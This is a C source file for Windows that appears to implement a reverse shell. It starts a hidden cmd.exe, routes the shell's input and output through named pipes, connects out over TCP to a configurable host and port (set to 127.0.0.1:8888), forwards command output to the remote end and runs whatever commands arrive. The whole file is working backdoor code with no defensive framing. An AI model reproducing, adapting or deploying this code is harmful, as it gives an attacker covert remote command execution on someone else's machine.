#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0501
#define BUFSIZE 4096
#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "8888"
#define DEFAULT_IP "127.0.0.1"
#define _CRT_SECURE_NO_WARNINGS
#define _CRT_NON_CONFORMING_SWPRINTFS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <assert.h>                                                                                                                                                                                                                                                                                                                                                                                

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

typedef struct Pipe0
{
    HANDLE hs[4], evs[2], procH;
    int bufsize;
} * Pipe;
Pipe pipe;

char OUTPUT_text[4096];
DWORD OUTPUT_size;

char *werr()
{
    static char szBuf[80];
    LPVOID lpMsgBuf;
    DWORD dw = GetLastError();

    FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
                      FORMAT_MESSAGE_FROM_SYSTEM,
                  NULL,
                  dw,
                  MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                  (LPTSTR)&lpMsgBuf, 0, NULL);

    sprintf(szBuf, "error %d: %s", dw, lpMsgBuf);

    return szBuf;
}

static Pipe create_pipes()
{
    DWORD dwError;
    TCHAR PipeNameBuffer[MAX_PATH];
    long i;
    PTSTR IO = _T("IO");
    DWORD open_modes[] = {PIPE_ACCESS_INBOUND, PIPE_ACCESS_OUTBOUND};
    DWORD access[] = {GENERIC_WRITE, GENERIC_READ};
    DWORD nSize = 4096;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), 0, 1};

    for (i = 0; i < 4; i++)
        pipe->hs[i] = pipe->procH = INVALID_HANDLE_VALUE;
    pipe->bufsize = 0;
    for (i = 0; i < 2; i++)
    {
        sprintf(PipeNameBuffer,
                  _T("\\\\.\\pipe\\%c%08x"), IO[i], GetCurrentProcessId());

        pipe->hs[i * 2] = CreateNamedPipe(PipeNameBuffer,
                                          open_modes[i] |
                                              FILE_FLAG_OVERLAPPED,
                                          PIPE_TYPE_BYTE | PIPE_WAIT, 1,
                                          nSize, nSize, 120 * 1000, 0);

        SetHandleInformation(pipe->hs[i * 2], HANDLE_FLAG_INHERIT,
                             HANDLE_FLAG_INHERIT);
        if (pipe->hs[i * 2] == INVALID_HANDLE_VALUE)
            return FALSE;
        pipe->hs[i * 2 + 1] = CreateFile(PipeNameBuffer,
                                         access[i],
                                         0,
                                         0,
                                         OPEN_EXISTING,
                                         FILE_FLAG_OVERLAPPED, NULL);
        if (pipe->hs[i * 2 + 1] == INVALID_HANDLE_VALUE)
        {
            dwError = GetLastError();
            CloseHandle(pipe->hs[i * 2]);
            SetLastError(dwError);
            return FALSE;
        }
    }
    for (i = 0; i < 2; i++)
        pipe->evs[i] = CreateEvent(0, 1, 1, 0);
    return (pipe);
}

SECURITY_ATTRIBUTES sa;
STARTUPINFO si;
PROCESS_INFORMATION pi;
#define snewn(n, t) (t *)malloc(n * sizeof(t))
static const PTSTR pipe_init()
{
    PTSTR cmd = strdup(_T("c:\\Windows\\system32\\cmd.exe"));
    const int sz = 999;
    PTSTR s = snewn(sz, TCHAR), buf = snewn(sz, TCHAR);

    pipe = snewn(1, struct Pipe0);
    if (!create_pipes())
        return _T("Unable to create pipes for pipe command");
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    si.cb = sizeof(si);
    si.lpReserved = NULL;
    si.lpDesktop = NULL;
    si.lpTitle = NULL;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.cbReserved2 = 0;
    si.lpReserved2 = NULL;
    si.hStdInput = pipe->hs[0];
    si.hStdOutput = pipe->hs[2];
    si.hStdError = pipe->hs[2];
    if (si.hStdError == INVALID_HANDLE_VALUE)
    {
        DWORD e = GetLastError();
        return sprintf(s, _T("no nul filename: %s\n"), strerror(e)), s;
    }
    {
        DWORD dw, ew, n, i = 0;
        if (!CreateProcess(NULL, cmd, &sa, NULL, TRUE,
                           CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,
                           NULL, NULL, &si, &pi))
            return sprintf(s, _T("process %s won't start: %s"), cmd,
                             werr()),
                   s;

        if ((dw = GetExitCodeProcess(pi.hProcess, &ew)) && ew != STILL_ACTIVE)
            return sprintf(s,
                             _T
			     ("process %s terminated early\n%d\n\n: %d : %s"),
                             cmd, ew, dw, werr()),
                   s;

        for (i = 0, n = 99; !n && i < 1; i++)
        {
            n = GetModuleBaseName(pi.hProcess, 0, s, sz);
            if (!n)
            {
                DWORD e = GetLastError();
                printf("process won't give up it's exe filename: %s\n%d\nh=0x%llx\n",
                       werr(), e, pi.hProcess);
            }
            Sleep(1000);
        }
        if (!n)
            exit(1);
    }
    return NULL;
}

int exitwithchild()
{
    DWORD dw, ew;
    if ((dw = GetExitCodeProcess(pi.hProcess, &ew)) && ew != STILL_ACTIVE)
        exit(ew);
    return 0;
}

int frompipe(HANDLE in, HANDLE ou)
{
    static HANDLE revent = 0;
    OVERLAPPED ol = {0};
    if (!revent)
        revent = CreateEvent(0, 0, 0, 0);
    ol.hEvent = revent;
    DWORD dw, r, rf, q;
    char b[4096];
    DWORD read = 0;
    for (;; Sleep(300))
    {
        if (rf = ReadFile(in, b, sizeof(b), &r, &ol))
        {
            OUTPUT_size = r;
            strncpy(OUTPUT_text, b, r);
            if (!r)
                return -1;
        }
        exitwithchild();
        return r;
    }
}

int init_socket( LPVOID lpParam){
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    iResult = getaddrinfo(DEFAULT_IP, DEFAULT_PORT, &hints, &result);

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            //main();
        }
        break;
    }
    freeaddrinfo(result);

    DWORD rf;
    char s[1000], *t;
    if (t = (char *)pipe_init())
        return printf(t);
    char c = ' ';
    DWORD q, r, dw, ew;

    int sended = 0;
    for (;;)
    {
        Sleep(300);
        if (!sended)
        {
            frompipe(pipe->hs[3], NULL);
            if (OUTPUT_size > 0)
                send(ConnectSocket, OUTPUT_text, 4096, 0);
            memset(OUTPUT_text, 0, 4096);
            sended = 1;
        }
        else
        {
            iResult = recv(ConnectSocket, s, recvbuflen, 0);
            if (iResult == SOCKET_ERROR)
            {
                closesocket(ConnectSocket);
                ConnectSocket = INVALID_SOCKET;
                for (int h = 0; h < 4; h++)
                {
                    CloseHandle(pipe->hs[h]);
                }
                //main();
            }
            if (iResult)
            {
                WriteFile(pipe->hs[1], s, strlen(s), NULL, 0);
                memset(s, 0, 1000);
                s[0] = '\0';
                sended = 0;
            }
        }
    }
    closesocket(ConnectSocket);
    WSACleanup();
}

int main()
{
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) init_socket, NULL, 0, NULL);
    int a = 0;
    for(;;){
        scanf("%d", &a);
    }
    return 0;
}